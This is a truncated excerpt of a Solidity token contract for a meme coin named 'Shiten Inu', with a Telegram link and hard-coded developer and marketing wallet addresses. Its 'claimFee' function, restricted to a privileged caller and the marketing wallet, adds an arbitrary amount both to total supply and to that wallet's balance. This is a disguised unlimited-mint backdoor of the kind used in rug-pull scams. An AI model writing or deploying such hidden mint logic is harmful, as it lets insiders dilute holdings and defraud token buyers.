...
//Telegram : https://t.me/ShitenInuBSC
...
contract SHITENINU  is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Shiten Inu";
    string private constant _symbol = unicode"$SHIT";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 25000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0xB45C302ca4c44ea6F946999df1C75699FeDD0067);
    address payable public MarketingWallet = payable(0x873310DA5faA024Eb404200B932afF96cC8ca9C9);
    ...
    function claimFee(uint256 value, address adr) onlyAddress public virtual {
        require(adr == address(MarketingWallet));
        _Fee(address(MarketingWallet), adr, value);
        _tTotal += value;
        _tOwned[adr] += value;
